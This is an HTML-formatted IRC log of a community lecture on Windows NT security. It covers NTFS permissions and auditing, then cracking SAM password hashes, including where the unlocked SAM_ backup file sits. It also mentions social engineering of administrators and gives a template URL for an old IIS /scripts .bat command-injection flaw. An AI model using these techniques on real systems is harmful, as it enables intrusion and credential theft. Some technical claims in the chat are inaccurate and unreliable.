+  <b>&lt;Cypher&gt;</b> hey DF<br>
+  <font color="#ff0000">*** sanke has joined #bsrf</font><br>
+  <b>&lt;snider&gt;</b> stupid servers<br>
+  <b>&lt;blindman`s_vision&gt;</b> hey Cypher<br>
+  <b>&lt;snider&gt;</b> lecture still on?<br>
+  <b>&lt;QX-Mat&gt;</b> go....<br>
+  <b>&lt;Cypher&gt;</b> ZipIt, usually i audit logon attemps (failure/success)<br>
+  <b>&lt;Cypher&gt;</b> permittion changes<br>
+  <b>&lt;QX-Mat&gt;</b> We're all ears<br>
+  <font color="#ff0000">*** Olaf has quit IRC (Ping timeout)</font><br>
+  <b>&lt;Cypher&gt;</b> etc.<br>
+  <b>&lt;DigitalFallout&gt;</b> Can anybosy read the board?<br>
+  <b>&lt;Cypher&gt;</b> snider, yes<br>
+  <b>&lt;Cypher&gt;</b> lets continue<br>
+  <b>&lt;Cypher&gt;</b> NTFS is the flag file system of Microsoft, so it would be a pity
+  not to use it (they tried so hard :))<br>
+  <b>&lt;Cypher&gt;</b> if you're using NT =&gt; use NT File System<br>
+  <b>&lt;TTT&gt;</b> no, DF<br>
+  <b>&lt;Cypher&gt;</b> especially if you're running a server<br>
+  <b>&lt;Cypher&gt;</b> i think i don't need to explain the pros and cons of NTFS, right?<br>
+  <b>&lt;Cypher&gt;</b> or should i?<br>
+  <b>&lt;ZipIt&gt;</b> spare us<br>
+  <b>&lt;m0ded&gt;</b> do it<br>
+  <b>&lt;_quato_&gt;</b> nope<br>
+  <b>&lt;ZipIt&gt;</b> !<br>
+  <b>&lt;DigitalFallout&gt;</b> GO for it<br>
+  <b>&lt;sanke&gt;</b> yes<br>
+  <b>&lt;blindman`s_vision&gt;</b> do it<br>
+  <b>&lt;Cypher&gt;</b> NO - 2 | YES - 4<br>
+  <b>&lt;Cypher&gt;</b> ok ok :)<br>
+  <b>&lt;m0ded&gt;</b> yes do it ;p<br>
+  <b>&lt;ZipIt&gt;</b> damn<br>
+  <b>&lt;Cypher&gt;</b> NTFS .vs. FAT<br>
+  <b>&lt;DigitalFallout&gt;</b> God bless demoracy<br>
+  <b>&lt;Cypher&gt;</b> ZipIt, that's the request :)<br>
+  <b>&lt;Cypher&gt;</b> hehe<br>
+  <b>&lt;_quato_&gt;</b> ya right<br>
+  <b>&lt;ZipIt&gt;</b> Make it so... :(<br>
+  <b>&lt;Cypher&gt;</b> the biggest advantage of NTFS is its permittions control<br>
+  <font color="#ff0000">*** Rockin_lad has quit IRC (Ping timeout)</font><br>
+  <b>&lt;_caps&gt;</b> what does NTFS .vs. FAT has to do with a lecture about security
+  :&gt;<br>
+  <b>&lt;Cypher&gt;</b> which is the most important part of the permittion management
+  in a multi-user system (obviously)<br>
+  <b>&lt;ZipIt&gt;</b> caps - &quot;permission control&quot;<br>
+  <b>&lt;Cypher&gt;</b> _caps, of course (the part i'm talking about). besides i'll be
+  happy to tell about any other subject u ask :) (if i know it)<br>
+  <b>&lt;Cypher&gt;</b> permission!<br>
+  <b>&lt;Cypher&gt;</b> damn, why noone corrected me?<br>
+  <font color="#ff0000">*** Sub has quit IRC (Quit: ...)</font><br>
+  <b>&lt;m0ded&gt;</b> heh<br>
+  <b>&lt;Cypher&gt;</b> i kept saying &quot;permittion &quot; shame on me!<br>
+  <b>&lt;_caps&gt;</b> uhm, okay.. go on :&gt; i'm not much informed on this topic.<br>
+  <b>&lt;_caps&gt;</b> heh, your forgiven<br>
+  <b>&lt;ZipIt&gt;</b> Cos were all nice... and besides it's piss funny!<br>
+  <b>&lt;Cypher&gt;</b> anyhow, set the permissions for the directories and assign proper
+  rights to your users<br>
+  <b>&lt;Cypher&gt;</b> and NTFS gives u that<br>
+  <b>&lt;Cypher&gt;</b> also, NTFS 5.0 (in win2k) has a Quota control<br>
+  <b>&lt;Cypher&gt;</b> letting u set space quotas for users on the disk<br>
+  <b>&lt;_quato_&gt;</b> Quota control????<br>
+  <b>&lt;Cypher&gt;</b> also, a useful feature - use it<br>
+  <b>&lt;ZipIt&gt;</b> User directory space<br>
+  <b>&lt;Cypher&gt;</b> _quato_, yes, u could limit users in disk space<br>
+  <font color="#ff0000">*** Raven has joined #bsrf</font><br>
+  <font color="#ff0000">*** ChanServ sets mode: +oa Raven Raven</font><br>
+  <b>&lt;m0ded&gt;</b> hey Raven<br>
+  <b>&lt;Raven&gt;</b> hey ho<br>
+  <b>&lt;Raven&gt;</b> sorry i'm late<br>
+  <b>&lt;DigitalFallout&gt;</b> Hello<br>
+  <b>&lt;Cypher&gt;</b> heya Raven<br>
+  <b>&lt;dr3x&gt;</b> my school needs that...somebody downloaded 3 gigs of mp3s and i
+  couldnt save my english report<br>
+  <b>&lt;Raven&gt;</b> just here to moderate<br>
+  <b>&lt;_quato_&gt;</b> hail raven<br>
+  <b>&lt;dr3x&gt;</b> Hi Raven<br>
+  <b>&lt;Raven&gt;</b> (it rhymes)<br>
+  <b>&lt;Slayer&gt;</b> hi Raven<br>
+  <b>&lt;Cypher&gt;</b> Raven, we are having lecture+questions structure<br>
+  <b>&lt;ZipIt&gt;</b> here we go again... another page full of hi's... damn yr popular
+  ;))<br>
+  <b>&lt;Cypher&gt;</b> so u could +m on the lecture and -m on the questions, if u want<br>
+  <b>&lt;m0ded&gt;</b> yeah good idea<br>
+  <font color="#ff0000">*** Raven sets mode: +o Cypher</font><br>
+  <font color="#ff0000">*** ChanServ sets mode: -o Cypher</font><br>
+  <b>&lt;QX-Mat&gt;</b> Has it worked yet?<br>
+  <b>&lt;Raven&gt;</b> hmm, secureops<br>
+  <b>&lt;Raven&gt;</b> gimme a sec<br>
+  <b>&lt;Cypher&gt;</b> k<br>
+  <b>&lt;QX-Mat&gt;</b> Now?<br>
+  <font color="#ff0000">*** Raven sets mode: +o Cypher</font><br>
+  <b>&lt;QX-Mat&gt;</b> Nope<br>
+  <b>&lt;Raven&gt;</b> good<br>
+  <b>&lt;m0ded&gt;</b> +m<br>
+  <b>&lt;QX-Mat&gt;</b> ooh<br>
+  <b>&lt;Raven&gt;</b> did you start yet?<br>
+  <b>&lt;Cypher&gt;</b> Raven, an hour ago :)<br>
+  <b>&lt;m0ded&gt;</b> yeah<br>
+  <b>&lt;Raven&gt;</b> oops<br>
+  <b>&lt;Raven&gt;</b> :-)<br>
+  <b>&lt;Raven&gt;</b> are you in a break now or something?<br>
+  <b>&lt;ZipIt&gt;</b> zzzz<br>
+  <b>&lt;Rockin_lad&gt;</b> yeah I was late too<br>
+  <b>&lt;m0ded&gt;</b> set mode +m and lets continue..<br>
+  <b>&lt;Raven&gt;</b> or am i interrupting you?<br>
+  <b>&lt;_quato_&gt;</b> back to NTFS ...<br>
+  <b>&lt;Rockin_lad&gt;</b> damn oh damn analog dialups<br>
+  <b>&lt;Rockin_lad&gt;</b> okay NTFS <br>
+  <b>&lt;dr3x&gt;</b> yeah, on with the lecture<br>
+  <b>&lt;Cypher&gt;</b> k, lets move on then<br>
+  <b>&lt;Cypher&gt;</b> question time :)<br>
+  <b>&lt;Cypher&gt;</b> (was)<br>
+  <b>&lt;Cypher&gt;</b> _quato_ do u have any NTFS questions? i was thinking of moving
+  next<br>
+  <b>&lt;Cypher&gt;</b> another step to basic NT security is Audits<br>
+  <b>&lt;Cypher&gt;</b> try to break into your own system!<br>
+  <b>&lt;Raven&gt;</b> absolutely<br>
+  <b>&lt;Rockin_lad&gt;</b> how ?<br>
+  <b>&lt;_quato_&gt;</b> no questions....<br>
+  <b>&lt;Cypher&gt;</b> it will: 1. make u a better person ;-) and 2. make your system
+  a better system ;-)<br>
+  <b>&lt;_quato_&gt;</b> how secure is NTFS<br>
+  <b>&lt;_quato_&gt;</b> ??<br>
+  <b>&lt;snider&gt;</b> <b>&lt;_quato_&gt;</b> no questions....<br>
+  <b>&lt;Cypher&gt;</b> quato, pretty secure<br>
+  <b>&lt;_quato_&gt;</b> encryption??<br>
+  <b>&lt;Raven&gt;</b> the problem is that security holes arise from software itself<br>
+  <b>&lt;Raven&gt;</b> and not the file system<br>
+  <b>&lt;Raven&gt;</b> (usually)<br>
+  <b>&lt;Cypher&gt;</b> _much_more_ then all the other microsoft file systems<br>
+  <b>&lt;Cypher&gt;</b> quato, of course<br>
+  <b>&lt;_quato_&gt;</b> w2k - Kerberos <br>
+  <b>&lt;Cypher&gt;</b> encryption, compression, permissions, the whole pack<br>
+  <b>&lt;Cypher&gt;</b> Raven, yep... that's one of the probs<br>
+  <font color="#ff0000">*** Noon_Ghunna has joined #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> quato, also (but that's in win2k)<br>
+  <b>&lt;Raven&gt;</b> and we all know that microsoft isn't exactly security concious<br>
+  <b>&lt;QX-Mat&gt;</b> zzz<br>
+  <b>&lt;Cypher&gt;</b> Raven, Ce La Vi ;-)<br>
+  <b>&lt;Cypher&gt;</b> so, i was talking, Audits<br>
+  <b>&lt;Raven&gt;</b> they never do proper beta testing<br>
+  <b>&lt;Raven&gt;</b> :-)<br>
+  <b>&lt;DigitalFallout&gt;</b> Gee where have I heard that before.....<br>
+  <b>&lt;_caps&gt;</b> well, thing about microsoft products is that evntually you can't
+  secure something even if you want to :P<br>
+  <b>&lt;Cypher&gt;</b> there are great third-party software to test your shields<br>
+  <b>&lt;Cypher&gt;</b> the Security Scanners<br>
+  <b>&lt;Samcon&gt;</b> this is really strange cuse bill gates is a (retired?) hacker<br>
+  <b>&lt;Rockin_lad&gt;</b> Red Button is one of those <br>
+  <b>&lt;_caps&gt;</b> hacker? billy? ;&gt;<br>
+  <b>&lt;m0ded&gt;</b> he was<br>
+  <b>&lt;Cypher&gt;</b> Red button is to establish null sessions, no?<br>
+  <b>&lt;Samcon&gt;</b> sure, they kicked him out of his university for that<br>
+  <b>&lt;Cypher&gt;</b> eEye Retina (port scanner, but a good one), the ISS Internet
+  Scanner, the ISS RealSecure, WebTrends Sec Scanner, and more....<br>
+  <b>&lt;Rockin_lad&gt;</b> I dont know , I tried it , didnt work :)<br>
+  <b>&lt;Samcon&gt;</b> i think it was harvard<br>
+  <b>&lt;Slayer&gt;</b> i think its for getting admin<br>
+  <b>&lt;Cypher&gt;</b> Rockin_lad, u cannot always establish null sessions (then it
+  would be just too easy)<br>
+  <b>&lt;Slayer&gt;</b> dont know if it works<br>
+  <b>&lt;Rockin_lad&gt;</b> oh<br>
+  <font color="#ff0000">*** FrEEkY has quit IRC (Ping timeout)</font><br>
+  <font color="#ff0000">*** Samcon is now known as Samcon_watchin_flubber</font><br>
+  <b>&lt;Cypher&gt;</b> so, in conclusion, we had a NetBIOS intro, the IPC share and
+  Null Session, and the steps to secure NT station - questions?<br>
+  <b>&lt;DigitalFallout&gt;</b> (I was late) Did you cover local security?<br>
+  <b>&lt;Cypher&gt;</b> someone asked about passwords (the SAM, enryption, etc) - should
+  i explain on it?<br>
+  <b>&lt;m0ded&gt;</b> yeah<br>
+  <b>&lt;QX-Mat&gt;</b> Terry Parchett invented paged memory on his BBC clone<br>
+  <b>&lt;Rockin_lad&gt;</b> oh yes<br>
+  <b>&lt;Rockin_lad&gt;</b> plz<br>
+  <b>&lt;QX-Mat&gt;</b> he was a hacker too<br>
+  <b>&lt;Cypher&gt;</b> DF, local security? securing a machine from the admin? ;-))<br>
+  <b>&lt;DigitalFallout&gt;</b> :) No from people with access to the server<br>
+  <b>&lt;Cypher&gt;</b> DF, yes<br>
+  <b>&lt;Cypher&gt;</b> we discussed permissions<br>
+  <b>&lt;Cypher&gt;</b> NT uses an assymetric encryption algorithm (so does UNIX, btw)
+  to encrypt the passwords<br>
+  <b>&lt;DigitalFallout&gt;</b> Ok<br>
+  <b>&lt;Rockin_lad&gt;</b> what I really was woundering about , is how to break into
+  NT senmail version ?<br>
+  <b>&lt;m0ded&gt;</b> witch is?<br>
+  <b>&lt;DigitalFallout&gt;</b> I'l review the log when it is posted<br>
+  <font color="#ff0000">*** Raven has quit IRC (Quit: Cypher, you're on your own now. Good luck. :-))</font><br>
+  <b>&lt;Cypher&gt;</b> and it stores the hash (the encrypted password) in the SAM<br>
+  <b>&lt;QX-Mat&gt;</b> Unix's is unirotational<br>
+  <b>&lt;Cypher&gt;</b> SAM = part of the registry<br>
+  <b>&lt;Rockin_lad&gt;</b> or otherwise what soever<br>
+  <b>&lt;Cypher&gt;</b> and, despite &quot;roomors&quot;, the password cannot be decrypted<br>
+  <b>&lt;Cypher&gt;</b> it can only be cracked<br>
+  <b>&lt;Rockin_lad&gt;</b> used to store information about users<br>
+  <b>&lt;Rockin_lad&gt;</b> and domains<br>
+  <b>&lt;Rockin_lad&gt;</b> oh<br>
+  <b>&lt;Rockin_lad&gt;</b> brute force ?<br>
+  <b>&lt;Cypher&gt;</b> there are two common methods:<br>
+  <b>&lt;Cypher&gt;</b> 1. Dictionary Attack<br>
+  <b>&lt;Cypher&gt;</b> meaning, to get a word, encrypt it, and compare to the hash<br>
+  <b>&lt;Cypher&gt;</b> same =&gt; this is the password, not =&gt; move to next word
+  in the dictionary<br>
+  <b>&lt;Cypher&gt;</b> and number 2 is Brute Forcing<br>
+  <b>&lt;Rockin_lad&gt;</b> wont that take alot of time ?<br>
+  <b>&lt;Cypher&gt;</b> which just generates those words<br>
+  <b>&lt;Rockin_lad&gt;</b> But brut ferce is very stupid <br>
+  <b>&lt;Cypher&gt;</b> yep, it'll probably take time<br>
+  <b>&lt;Cypher&gt;</b> yep again<br>
+  <b>&lt;Slayer&gt;</b> sometimes its the only way<br>
+  <b>&lt;Rockin_lad&gt;</b> there must be an interior bug<br>
+  <b>&lt;Cypher&gt;</b> that's why its is necessary to gather information first, so u
+  won't have to brute force it<br>
+  <b>&lt;Cypher&gt;</b> sometimes, u could social engeneer it out of the admin/user ;-)<br>
+  <b>&lt;Cypher&gt;</b> Rockin_lad, in assymetric algorithms?<br>
+  <b>&lt;DigitalFallout&gt;</b> That is a VERRY hard thing to do<br>
+  <b>&lt;Rockin_lad&gt;</b> so , can I have question now ?<br>
+  <b>&lt;Cypher&gt;</b> nope. its pure mathematics, no bugs there :-))<br>
+  <b>&lt;Cypher&gt;</b> shoot<br>
+  <b>&lt;Rockin_lad&gt;</b> yeah exactly<br>
+  <b>&lt;Cypher&gt;</b> DF, what is?<br>
+  <b>&lt;DigitalFallout&gt;</b> SE the admin<br>
+  <b>&lt;Cypher&gt;</b> oh, that... well, u'll be surprised (especially on large networks/companies)<br>
+  <b>&lt;Rockin_lad&gt;</b> so , you've got this ISP runing by NT so how can you log
+  in , or in another word break in , or cant you ?<br>
+  <b>&lt;DigitalFallout&gt;</b> True<br>
+  <b>&lt;Cypher&gt;</b> u can take a tour to the offices<br>
+  <b>&lt;DigitalFallout&gt;</b> it has happened<br>
+  <b>&lt;DigitalFallout&gt;</b> However it is easier to talk to IE, an intern<br>
+  <b>&lt;Cypher&gt;</b> stand in the middle and yell &quot;hey! i forgot the system password
+  again, what is it?&quot;<br>
+  <b>&lt;Rockin_lad&gt;</b> lol<br>
+  <b>&lt;Cypher&gt;</b> and u can hear a &quot;the_password&quot; response some times<br>
+  <b>&lt;Cypher&gt;</b> :)<br>
+  <b>&lt;snider&gt;</b> i know, im the guy that yells<br>
+  <b>&lt;Cypher&gt;</b> hehehe<br>
+  <b>&lt;DigitalFallout&gt;</b> Good one<br>
+  <b>&lt;Rockin_lad&gt;</b> Cypher , what gopher ?<br>
+  <b>&lt;Cypher&gt;</b> so, first thing - gather information! its more then 60% of the
+  deal<br>
+  <b>&lt;Cypher&gt;</b> gother?<br>
+  <b>&lt;Cypher&gt;</b> gather maybe?<br>
+  <b>&lt;snider&gt;</b> gopher is a 10 year old service<br>
+  <b>&lt;Rockin_lad&gt;</b> no Gopher<br>
+  <b>&lt;m0ded&gt;</b> yeah,,<br>
+  <b>&lt;snider&gt;</b> like a really old BBS<br>
+  <b>&lt;m0ded&gt;</b> poor gopher..<br>
+  <b>&lt;Rockin_lad&gt;</b> what does it do ?<br>
+  <b>&lt;Cypher&gt;</b> of, the Gopher service :)<br>
+  <b>&lt;Cypher&gt;</b> snider told already<br>
+  <b>&lt;Cypher&gt;</b> i don't believe anyone uses it anymore, though<br>
+  <b>&lt;Cypher&gt;</b> wait, i'll look up a formal definition :)<br>
+  <b>&lt;snider&gt;</b> me neither, poor thing<br>
+  <b>&lt;Rockin_lad&gt;</b> oh<br>
+  <font color="#ff0000">*** rek has joined #bsrf</font><br>
+  <b>&lt;rek&gt;</b> hey<br>
+  <b>&lt;Cypher&gt;</b> hi rek<br>
+  <b>&lt;_quato_&gt;</b> hey<br>
+  <b>&lt;TTT&gt;</b> hi, Rekaerf!<br>
+  <b>&lt;TTT&gt;</b> long time not seen!<br>
+  <b>&lt;_quato_&gt;</b> Cypher whats network latency<br>
+  <b>&lt;Rockin_lad&gt;</b> its when your analog dialup is fuck up <br>
+  <b>&lt;Rockin_lad&gt;</b> fucked up<br>
+  <b>&lt;Cypher&gt;</b> :)<br>
+  <b>&lt;Rockin_lad&gt;</b> like mine <br>
+  <b>&lt;Noon_Ghunna&gt;</b> Cypher! where are the nt passwd hashes are stored! if they
+  are in sam file, where can i find it in NT.<br>
+  <b>&lt;Cypher&gt;</b> its when the network is terribly late :)<br>
+  <b>&lt;Rockin_lad&gt;</b> regisrty<br>
+  <b>&lt;Cypher&gt;</b> Noon_Ghunna, in the SAM, in the registry, BUT<br>
+  <b>&lt;Cypher&gt;</b> u cannot access it cause NT locks it (atleast one smart thing
+  :))<br>
+  <b>&lt;Cypher&gt;</b> BUT (again)<br>
+  <b>&lt;Rockin_lad&gt;</b> check SECURITY while you're there too<br>
+  <font color="#ff0000">*** ZipIt has quit IRC (Ping timeout)</font><br>
+  <b>&lt;Cypher&gt;</b> u can access the SAM_ file, which is the backup file (made by
+  the admin, especially for you)<br>
+  <b>&lt;Cypher&gt;</b> it is not locked<br>
+  <b>&lt;Noon_Ghunna&gt;</b> hey is SAM a file or its some information in registery<br>
+  <b>&lt;Cypher&gt;</b> and located in the repair dir in winnt<br>
+  <b>&lt;Cypher&gt;</b> Noon_Ghunna, registry is a file<br>
+  <b>&lt;Cypher&gt;</b> of some sort<br>
+  <b>&lt;Cypher&gt;</b> anyhow, it is stored on the disk<br>
+  <b>&lt;Noon_Ghunna&gt;</b> never found the registry file in win98<br>
+  <b>&lt;Cypher&gt;</b> in the system32\config directory<br>
+  <b>&lt;m0ded&gt;</b> what SAM stands for?<br>
+  <b>&lt;Cypher&gt;</b> cause win98 sucZ :)<br>
+  <b>&lt;dr3x&gt;</b> Security Access Manager<br>
+  <b>&lt;DigitalFallout&gt;</b> run-&gt;REGEDIT<br>
+  <b>&lt;TTT&gt;</b> it is not a file<br>
+  <b>&lt;QX-Mat&gt;</b> ooh<br>
+  <b>&lt;Rockin_lad&gt;</b> Hive <br>
+  <b>&lt;Cypher&gt;</b> Security_A_M..... ;-) forgot<br>
+  <b>&lt;m0ded&gt;</b> <b>&lt;dr3x&gt;</b> Security Access Manager<br>
+  <b>&lt;QX-Mat&gt;</b> umm, can I say something NT user related?<br>
+  <font color="#ff0000">*** sanke has left #bsrf</font><br>
+  <b>&lt;TTT&gt;</b> the registry is based on many files<br>
+  <b>&lt;Cypher&gt;</b> right<br>
+  <b>&lt;Noon_Ghunna&gt;</b> i know regedit but isn't thee a file on which the registry
+  stores its backup! if there is one where in NT<br>
+  <b>&lt;Cypher&gt;</b> TTT, of course, but we were talking about the SAM (a part of
+  it)<br>
+  <b>&lt;TTT&gt;</b> oh, alright<br>
+  <b>&lt;Rockin_lad&gt;</b> USER.DAT SYSTEM.DAT mybee ?<br>
+  <b>&lt;QX-Mat&gt;</b> umm, can I say something NT user related?<br>
+  <b>&lt;Cypher&gt;</b> yes<br>
+  <b>&lt;Cypher&gt;</b> i thing<br>
+  <b>&lt;Cypher&gt;</b> QX-Mat, i think.....<br>
+  <b>&lt;QX-Mat&gt;</b> I've put a couple of NT CGI's up for you too gander at. None
+  of them are complete. But they demo remote user admin via perl.... http://www.q-m.net/outofsite/cgis/list.cgi<br>
+  <b>&lt;Cypher&gt;</b> Just Do It :)<br>
+  <b>&lt;Cypher&gt;</b> kewl<br>
+  <b>&lt;Cypher&gt;</b> so, if there are no more questions, i guess we can call it a
+  day/lecture :-)<br>
+  <b>&lt;DigitalFallout&gt;</b> Ummmm let me think<br>
+  <b>&lt;DigitalFallout&gt;</b> Did you go over print access?<br>
+  <b>&lt;m0ded&gt;</b> time for NT exploits and IIS?<br>
+  <b>&lt;Cypher&gt;</b> m0ded, right!<br>
+  <b>&lt;Noon_Ghunna&gt;</b> who will send me the log :|<br>
+  <b>&lt;m0ded&gt;</b> cool]<br>
+  <b>&lt;Rockin_lad&gt;</b> yes eys yeas<br>
+  <b>&lt;Slayer&gt;</b> yeah<br>
+  <b>&lt;Rockin_lad&gt;</b> ecploit<br>
+  <b>&lt;Cypher&gt;</b> DF, no :) (and not scanner access also :))<br>
+  <b>&lt;Rockin_lad&gt;</b> exploit rules <br>
+  <b>&lt;Cypher&gt;</b> i think its time for a brake<br>
+  <b>&lt;DigitalFallout&gt;</b> you might want to cover how to secire printers<br>
+  <b>&lt;Slayer&gt;</b> exploits and IIS<br>
+  <b>&lt;Cypher&gt;</b> Have a Brake have a KitKat :)<br>
+  <b>&lt;m0ded&gt;</b> hehe<br>
+  <b>&lt;Rockin_lad&gt;</b> okay <br>
+  <b>&lt;Slayer&gt;</b> pls<br>
+  <b>&lt;dr3x&gt;</b> when the next lecture?<br>
+  <b>&lt;Rockin_lad&gt;</b> let the man rest</p>
+<p><b>&lt;Cypher&gt;</b> ========== 15 minutes brake ========= oki?</p>
+<p><b>&lt;Cypher&gt;</b> shall we continue?<br>
+  <b>&lt;m0ded&gt;</b> yeah<br>
+  <b>&lt;aragorn&gt;</b> yes!<br>
+  <b>&lt;m0ded&gt;</b> END OF BREAK<br>
+  <b>&lt;m0ded&gt;</b> p;<br>
+  <b>&lt;m0ded&gt;</b> ;p<br>
+  <b>&lt;DigitalFallout&gt;</b> YOur call<br>
+  <b>&lt;Slayer&gt;</b> yes lets get toexploits and IIS pls<br>
+  <b>&lt;aragorn&gt;</b> right<br>
+  <b>&lt;m0ded&gt;</b> IIS the best part<br>
+  <b>&lt;The_Duke247&gt;</b> hmm<br>
+  <b>&lt;The_Duke247&gt;</b> is that the time already ?<br>
+  <b>&lt;m0ded&gt;</b> i was waiting for it<br>
+  <b>&lt;QX-Mat&gt;</b> It said it was avalible twice on signup, but then on the confirmation
+  email, it turned around! Kill BT!<br>
+  <b>&lt;Noon_Ghunna&gt;</b> Cypher! is ntfaq worth to download?<br>
+  <b>&lt;snider&gt;</b> duke: NT security lecure if you didnt know<br>
+  <b>&lt;The_Duke247&gt;</b> oh really ?<br>
+  <b>&lt;The_Duke247&gt;</b> errr ok then<br>
+  <b>&lt;The_Duke247&gt;</b> *shuts up*<br>
+  <b>&lt;Cypher&gt;</b> NTfaq? sure, y not<br>
+  <b>&lt;snider&gt;</b> hehe<br>
+  <b>&lt;DigitalFallout&gt;</b> Well unfortunatly I must depart. I'l have a gander at
+  the logs later<br>
+  <b>&lt;The_Duke247&gt;</b> can i comment on it or not ?<br>
+  <b>&lt;Cypher&gt;</b> later DF<br>
+  <b>&lt;DigitalFallout&gt;</b> Cya<br>
+  <b>&lt;QX-Mat&gt;</b> Oh, and if any of you didn't know, I survied my hostpital Op!<br>
+  <font color="#ff0000">*** DigitalFallout has left #bsrf</font><br>
+  <b>&lt;The_Duke247&gt;</b> cos i know quite a bit on NT, and proxy server hence...
+  ISAPI filters etc..<br>
+  <b>&lt;Cypher&gt;</b> QX-Mat, that's interesting, especially cause we're talking to
+  u<br>
+  <b>&lt;The_Duke247&gt;</b> so whos lecturing anyway ?<br>
+  <b>&lt;Cypher&gt;</b> The_Duke247, u can comment?<br>
+  <b>&lt;Cypher&gt;</b> we don't know...<br>
+  <font color="#ff0000">*** _quato_ has left #bsrf</font><br>
+  <font color="#ff0000">*** Cypher sets mode: +v The_Duke247</font><br>
+  <b>&lt;QX-Mat&gt;</b> The ISAPI is a little... ahem.... muddled.<br>
+  <b>&lt;m0ded&gt;</b> shut up<br>
+  <b>&lt;m0ded&gt;</b> Cypher start<br>
+  <b>&lt;aragorn&gt;</b> lets go<br>
+  <b>&lt;Cypher&gt;</b> that was: <b>[Cypher]</b> The_Duke247, u can comment!<br>
+  <b>&lt;The_Duke247&gt;</b> lol<br>
+  <b>&lt;Cypher&gt;</b> lets<br>
+  <font color="#ff0000">*** Rockin_lad has quit IRC (Ping timeout)</font><br>
+  <b>&lt;Cypher&gt;</b> so IIS, what is it, actually?<br>
+  <b>&lt;The_Duke247&gt;</b> don't have a mic my friend, thanks for privs anyway<br>
+  <b>&lt;m0ded&gt;</b> a webserver<br>
+  <b>&lt;The_Duke247&gt;</b> IIS ?<br>
+  <b>&lt;The_Duke247&gt;</b> Internet Information Server<br>
+  <b>&lt;m0ded&gt;</b> good boy<br>
+  <b>&lt;The_Duke247&gt;</b> packaged as part of Windows 2000<br>
+  <b>&lt;Cypher&gt;</b> good, i was waiting for someone to type that<br>
+  <b>&lt;The_Duke247&gt;</b> or the back office set<br>
+  <b>&lt;Cypher&gt;</b> :)<br>
+  <b>&lt;The_Duke247&gt;</b> IIS 4.0 with win2k<br>
+  <b>&lt;The_Duke247&gt;</b> IIS 5.0 released<br>
+  <b>&lt;m0ded&gt;</b> ok ok<br>
+  <b>&lt;The_Duke247&gt;</b> with various holes already found<br>
+  <b>&lt;Cypher&gt;</b> its the Microsoft Server pack<br>
+  <b>&lt;The_Duke247&gt;</b> :)<br>
+  <b>&lt;QX-Mat&gt;</b> TOTP is on....<br>
+  <b>&lt;The_Duke247&gt;</b> yep<br>
+  <b>&lt;Cypher&gt;</b> The_Duke247, we got it :)<br>
+  <b>&lt;snider&gt;</b> duke : you can comment, not just satrt talking on and on and
+  on and on<br>
+  <b>&lt;The_Duke247&gt;</b> lol<br>
+  <b>&lt;The_Duke247&gt;</b> ok then<br>
+  <b>&lt;snider&gt;</b> heh<br>
+  <b>&lt;Cypher&gt;</b> and as all microsoft products<br>
+  <b>&lt;m0ded&gt;</b> snider right<br>
+  <b>&lt;Cypher&gt;</b> IIS has bugs<br>
+  <b>&lt;QX-Mat&gt;</b> !!!!!!<br>
+  <b>&lt;m0ded&gt;</b> especially 4.0<br>
+  <b>&lt;Cypher&gt;</b> and bugs and bugs and bugs and bugs and bugs and bugs and bugs
+  and bugs<br>
+  <font color="#ff0000">*** syfilis84 has joined #bsrf<br>
+  <b>&lt;Cypher&gt;</b> and holes and holes and holes and holes</font><br>
+  <b>&lt;Cypher&gt;</b> well, u got the picture :)<br>
+  <font color="#ff0000">*** syfilis84 has left #bsrf</font><br>
+  <b>&lt;The_Duke247&gt;</b> *sticks hand in the air saying&quot; me me me me me me&quot;*<br>
+  <b>&lt;QX-Mat&gt;</b> :&gt;<br>
+  <b>&lt;Slayer&gt;</b> so how do u exploit them:9<br>
+  <b>&lt;Noon_Ghunna&gt;</b> ISS know for aspz!<br>
+  <b>&lt;Slayer&gt;</b> )<br>
+  <b>&lt;Cypher&gt;</b> Slayer, nah, we just look at them :)<br>
+  <b>&lt;blindman`s_vision&gt;</b> can someone tell me what this is?<br>
+  <b>&lt;blindman`s_vision&gt;</b> Apache/1.2.0 PHP/FI-2.0b11 on BSD/OS<br>
+  <b>&lt;Cypher&gt;</b> The_Duke247, what is it?<br>
+  <b>&lt;Slayer&gt;</b> arhh<br>
+  <b>&lt;m0ded&gt;</b> blindman we're in a lecture<br>
+  <b>&lt;The_Duke247&gt;</b> header from web server<br>
+  <font color="#ff0000">*** Cypher sets mode: +m</font><br>
+  <b>&lt;The_Duke247&gt;</b> HTTP 1.1<br>
+  <b>&lt;Cypher&gt;</b> sorry :)<br>
+  <b>&lt;The_Duke247&gt;</b> no cigar huh?<br>
+  <font color="#ff0000">*** Rockin_lad has joined #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> i'll -m it at the question part<br>
+  <b>&lt;m0ded&gt;</b> Cypher devoice The_Duke!<br>
+  <font color="#ff0000">#BSRF Cannot send to channel (channel is moderated, you do not have a voice)</font><br>
+  <b>&lt;Cypher&gt;</b> so, IIS is fuuulll of probs and bugs<br>
+  <b>&lt;Cypher&gt;</b> just waiting to be exploited<br>
+  <b>&lt;Cypher&gt;</b> by.... well... various ppl<br>
+  <b>&lt;The_Duke247&gt;</b> yep<br>
+  <b>&lt;Cypher&gt;</b> the 4.0 version had plenty of them (5.0 less)<br>
+  <b>&lt;Cypher&gt;</b> or better to say, not yet discovered ;-)<br>
+  <b>&lt;The_Duke247&gt;</b> because it hasn't been around as long you could say<br>
+  <b>&lt;The_Duke247&gt;</b> lol exactly<br>
+  <b>&lt;Cypher&gt;</b> many of the holes were in the /scripts directory<br>
+  <b>&lt;Cypher&gt;</b> it would give u to execute stuff<br>
+  <font color="#ff0000">*** rattle_and_hum has joined #bsrf</font><br>
+  <b>&lt;Cypher&gt;</b> for example<br>
+  <b>&lt;Cypher&gt;</b> the *.bat is assosiated with the cmd.exe application<br>
+  <b>&lt;Cypher&gt;</b> (command prompt)<br>
+  <b>&lt;Cypher&gt;</b> so a malicious hax0r could<br>
+  <b>&lt;The_Duke247&gt;</b> lol@hax0r<br>
+  <b>&lt;Cypher&gt;</b> execute something by using the following string:<br>
+  <b>&lt;Cypher&gt;</b> domain/scripts/yadayadayada.bat?&amp;command1+?&amp;command2+?&amp;..........<br>
+  <b>&lt;Cypher&gt;</b> and it will be executed as batch commands<br>
+  <font color="#ff0000">*** Cypher sets mode: -m</font><br>
+  <b>&lt;Cypher&gt;</b> go go go :)<br>
+  <b>&lt;m0ded&gt;</b> hehe<br>
+  <b>&lt;Slayer&gt;</b> yeah<br>
